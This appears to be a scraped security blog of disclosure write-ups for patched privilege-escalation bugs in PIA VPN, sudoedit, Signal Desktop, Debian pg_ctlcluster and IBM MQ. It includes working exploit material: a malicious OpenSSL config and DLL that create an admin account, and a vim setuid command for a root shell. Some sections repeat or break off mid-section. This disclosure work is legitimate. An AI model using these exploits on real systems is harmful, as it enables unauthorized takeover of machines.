## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png?w=712)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is my goto Windows utility for understanding how applications interact with the file system, registry, and process creation. I am especially interested in services since most execute with higher privileges. The latest PIA desktop application runs a service(pia-service.exe) at startup using the local SYSTEM account. This service handles privileged operations on behalf of the client.

Procmon has a feature to run at boot time. This is especially helpful for obtaining information on the various services that startup. To enable this, simply select Options / Enable Boot Logging. After you click “Enable Boot Logging”, a new window will appear. Click the “OK” button. Close Procmon and reboot the system.

![procmon-enable-boot](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-enable-boot.png?w=298&h=278)![]()![procmon-enable-boot-2ndprompt](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-enable-boot-2ndprompt.png?w=712)

After the system reboots, login and open Procmon. Adjust the filter to the following criteria. This will show attempts to access files that do not exist by any user that begins with NT. After the filter is applied you will be prompted to save the boot time PML file. Select a location and click ok. This may take a while to load.![procmon-post-boot-filter](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-post-boot-filter.png?w=712)

With Procmon I generally look for paths that a low privileged user may have write access to such as C:\ProgramData, C:\users\, c:\Windows\Temp, or directories located at the root of the drive. When researching PIA I noticed it attempted to open c:\etc\ssl\openssl.cnf.  I was interested to see if this configuration file could be leveraged. I had used an openssl.cnf in the past, but only for creating TLS certificates.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png?w=712)

When looking for privilege escalation opportunities I want to understand built-in functionality and find ways to abuse it. A low privileged user is allowed to create directories under c:\ so I can control the path. /etc/ssl is a Linux path which is interesting but most likely the application was [cross compiled](https://en.wikipedia.org/wiki/Cross_compiler). Windows systems support the Linux path convention so “/” is translated to the root of the drive C:\.

Reading the OpenSSL [config(5)](https://www.openssl.org/docs/manmaster/man5/config.html) documentation I noticed the configuration allows for external “Engine” libraries to be loaded. I also found a working [example](https://github.com/ThomasHabets/openssl-tpm-engine/blob/master/openssl.cnf.sample) on Github.

At this point it appeared that I may have the capability to trick a process running as SYSTEM to load a DLL that I create. I created a new openssl.cnf file using the example as a template. The only real change was the path to the library. This needed to be changed where the PIA service was reading from.

```
# Malicious openssl.cnf
openssl_conf = openssl_init
[openssl_init]
engines = engine_section

[engine_section]
woot = woot_section

[woot_section]
engine_id = woot
dynamic_path = c:\\etc\\ssl\\woot.dll
init = 0

```

Now that the configuration is ready the last step was to create a malicious library. There are many options for doing this but I already had a simple DLL ready from other research projects. When loaded, this code will execute [net user](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865%28v%3Dws.11%29) commands to create a local administrator account named “woot”. No attempt was made to be stealthy. I plan to make an enhanced version in the future and will post details when completed. After compiling woot.dll I copied it to c:\etc\ssl as low privileged user.

```
/* Cross Compile with
   x86_64-w64-mingw32-g++ woot.c -o woot.dll -shared
*/
#include < windows.h>
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            system("cmd /c net user woot securepasswordhere /add");
            system("cmd /c net localgroup administrators woot /add");
            break;
        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;
        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;
        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

```

A low privileged user cannot restart the PIA service so a reboot is required. I setup Procmon to run on boot like before and then rebooted the system. This post-boot image shows the pia-service.exe running as SYSTEM and loading the woot.dll library. ![pia-openssl-engine-loading](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-engine-loading.png?w=712)

Login as the newly created woot local administrator account.![woot-cmd](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=712)

I have discovered the same vulnerability with multiple products so I decided to make a utility to automate OpenSSL libraries by extracting the version and OPENSSLDIR value. The project can be found at <https://github.com/mirchr/openssldir_check/>. Here is a screenshot of what openssldir\_check shows for the vulnerable version of PIA. Note that OPENSSLDIR is set to “/etc/ssl”. This translates to c:\etc\ssl on Windows.

![openssldir_check-pia](https://blog.mirch.io/wp-content/uploads/2019/06/openssldir_check-pia.png?w=712)

### **Summary**

Any Windows client or server application that bundles OpenSSL libraries should be reviewed to ensure that the OPENSSLDIR is not set to a path that could be writable from a low privileged user account.

I worked directly with the vendor(London Trust Media) and all of the vulnerabilities have been patched. It was a pleasure working with the security team at PIA. They were responsive and I appreciate the partnership to resolve the issues.

Title: PIA Windows Privilege Escalation: Malicious OpenSSL engine
Author: Rich Mirch
CVE: CVE-2019-12572
Vendor Advisory: N/A
Blog Post: https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/
Description
A vulnerability in the London Trust Media Private Internet Access (PIA) VPN
Client 1.0.2 (build 02363) for Windows could allow an authenticated, local
attacker to run arbitrary code with elevated privileges.
On startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from
C:\Program Files\Private Internet Access\libeay32.dll. This library attempts
to load the c:\etc\ssl\openssl.cnf configuration file which does not exist. By
default on Windows systems, authenticated users can create directories under c:\.
A low privileged user can create an openssl.cnf configuration file to load a
malicious OpenSSL engine library resulting in the arbitrary code execution as
SYSTEM when the service starts.
CVSS
Vector: CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:C
Base: 7.8
Temporal: 7.8
Test Environment
OS: Windows 10 Pro 10.0.17763
PIA Version: 1.0.2 (build 02363)
Steps to reproduce
Note: All steps are executed using a low privileged account.
1) Create the c:\etc\ssl directory
mkdir c:\etc\ssl
2) Create a malicious engine library named woot.dll to create an administrator
account named woot when loaded.
/\* Cross Compile with
x86\_64-w64-mingw32-g++ woot.c -o woot.dll -shared
\*/
#include
BOOL WINAPI DllMain(
HINSTANCE hinstDLL,
DWORD fdwReason,
LPVOID lpReserved )
{
switch( fdwReason )
{
case DLL\_PROCESS\_ATTACH:
system("cmd /c net user woot insertpasswordhere /add");
system("cmd /c net localgroup administrators woot /add");
break;
case DLL\_THREAD\_ATTACH:
// Do thread-specific initialization.
break;
case DLL\_THREAD\_DETACH:
// Do thread-specific cleanup.
break;
case DLL\_PROCESS\_DETACH:
// Perform any necessary cleanup.
break;
}
return TRUE; // Successful DLL\_PROCESS\_ATTACH.
}
3) Copy the malicious woot.dll file into the c:\etc\ssl folder.
copy woot.dll c:\etc\ssl
4) Create the OpenSSL configuration file in c:\etc\ssl\openssl.cnf with the following contents.
openssl\_conf = openssl\_init
[openssl\_init]
engines = engine\_section
[engine\_section]
woot = woot\_section
[woot\_section]
engine\_id = woot
dynamic\_path = c:\\etc\\ssl\\woot.dll
init = 0
5) Reboot the system because a low privilege user does not have permission to
restart the service.
6) After the reboot has completed, login and open a command shell. At this point
the "woot" administrator account will exist.
net user woot
Timeline:
2019-02-16: Reported to vendor
2019-02-16: Vendor confirmed vulnerability
2019-06-04: Vendor released fix in v1.2.1

Login as the newly created woot local administrator account.![woot-cmd](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=712)

I have discovered the same vulnerability with multiple products so I decided to make a utility to automate OpenSSL libraries by extracting the version and OPENSSLDIR value. The project can be found at <https://github.com/mirchr/openssldir_check/>. Here is a screenshot of what openssldir\_check shows for the vulnerable version of PIA. Note that OPENSSLDIR is set to “/etc/ssl”. This translates to c:\etc\ssl on Windows.

![openssldir_check-pia](https://blog.mirch.io/wp-content/uploads/2019/06/openssldir_check-pia.png?w=712)

### **Summary**

Any Windows client or server application that bundles OpenSSL libraries should be reviewed to ensure that the OPENSSLDIR is not set to a path that could be writable from a low privileged user account.

I worked directly with the vendor(London Trust Media) and all of the vulnerabilities have been patched. It was a pleasure working with the security team at PIA. They were responsive and I appreciate the partnership to resolve the issues.

### **Test Environment**

OS: Windows 10 Pro 10.0.17763

PIA Version: 1.0.2 (build 02363)

### **Timeline**

2019-02-16 Contact vendor via email
2019-02-16 Vendor confirmed receipt
2019-05-20 Contacted vendor about coordinated disclosure
2019-05-24 Agreement reached on the public disclosure date
2019-06-04 Patched version v1.2.1 released to the public
2019-06-10 Public Disclosure

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me.

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png?w=712)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is my goto Windows utility for understanding how applications interact with the file system, registry, and process creation. I am especially interested in services since most execute with higher privileges. The latest PIA desktop application runs a service(pia-service.exe) at startup using the local SYSTEM account. This service handles privileged operations on behalf of the client.

Procmon has a feature to run at boot time. This is especially helpful for obtaining information on the various services that startup. To enable this, simply select Options / Enable Boot Logging. After you click “Enable Boot Logging”, a new window will appear. Click the “OK” button. Close Procmon and reboot the system.

![procmon-enable-boot](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-enable-boot.png?w=298&h=278)![]()![procmon-enable-boot-2ndprompt](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-enable-boot-2ndprompt.png?w=712)

After the system reboots, login and open Procmon. Adjust the filter to the following criteria. This will show attempts to access files that do not exist by any user that begins with NT. After the filter is applied you will be prompted to save the boot time PML file. Select a location and click ok. This may take a while to load.![procmon-post-boot-filter](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-post-boot-filter.png?w=712)

With Procmon I generally look for paths that a low privileged user may have write access to such as C:\ProgramData, C:\users\, c:\Windows\Temp, or directories located at the root of the drive. When researching PIA I noticed it attempted to open c:\etc\ssl\openssl.cnf.  I was interested to see if this configuration file could be leveraged. I had used an openssl.cnf in the past, but only for creating TLS certificates.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png?w=712)

When looking for privilege escalation opportunities I want to understand built-in functionality and find ways to abuse it. A low privileged user is allowed to create directories under c:\ so I can control the path. /etc/ssl is a Linux path which is interesting but most likely the application was [cross compiled](https://en.wikipedia.org/wiki/Cross_compiler). Windows systems support the Linux path convention so “/” is translated to the root of the drive C:\.

Reading the OpenSSL [config(5)](https://www.openssl.org/docs/manmaster/man5/config.html) documentation I noticed the configuration allows for external “Engine” libraries to be loaded. I also found a working [example](https://github.com/ThomasHabets/openssl-tpm-engine/blob/master/openssl.cnf.sample) on Github.

At this point it appeared that I may have the capability to trick a process running as SYSTEM to load a DLL that I create. I created a new openssl.cnf file using the example as a template. The only real change was the path to the library. This needed to be changed where the PIA service was reading from.

```
# Malicious openssl.cnf
openssl_conf = openssl_init
[openssl_init]
engines = engine_section

[engine_section]
woot = woot_section

[woot_section]
engine_id = woot
dynamic_path = c:\\etc\\ssl\\woot.dll
init = 0

```

Now that the configuration is ready the last step was to create a malicious library. There are many options for doing this but I already had a simple DLL ready from other research projects. When loaded, this code will execute [net user](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865%28v%3Dws.11%29) commands to create a local administrator account named “woot”. No attempt was made to be stealthy. I plan to make an enhanced version in the future and will post details when completed. After compiling woot.dll I copied it to c:\etc\ssl as low privileged user.

```
/* Cross Compile with
   x86_64-w64-mingw32-g++ woot.c -o woot.dll -shared
*/
#include < windows.h>
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            system("cmd /c net user woot securepasswordhere /add");
            system("cmd /c net localgroup administrators woot /add");
            break;
        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;
        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;
        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

```

A low privileged user cannot restart the PIA service so a reboot is required. I setup Procmon to run on boot like before and then rebooted the system. This post-boot image shows the pia-service.exe running as SYSTEM and loading the woot.dll library. ![pia-openssl-engine-loading](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-engine-loading.png?w=712)

Login as the newly created woot local administrator account.![woot-cmd](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=712)

I have discovered the same vulnerability with multiple products so I decided to make a utility to automate OpenSSL libraries by extracting the version and OPENSSLDIR value. The project can be found at <https://github.com/mirchr/openssldir_check/>. Here is a screenshot of what openssldir\_check shows for the vulnerable version of PIA. Note that OPENSSLDIR is set to “/etc/ssl”. This translates to c:\etc\ssl on Windows.

![openssldir_check-pia](https://blog.mirch.io/wp-content/uploads/2019/06/openssldir_check-pia.png?w=712)

### **Summary**

Any Windows client or server application that bundles OpenSSL libraries should be reviewed to ensure that the OPENSSLDIR is not set to a path that could be writable from a low privileged user account.

I worked directly with the vendor(London Trust Media) and all of the vulnerabilities have been patched. It was a pleasure working with the security team at PIA. They were responsive and I appreciate the partnership to resolve the issues.

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

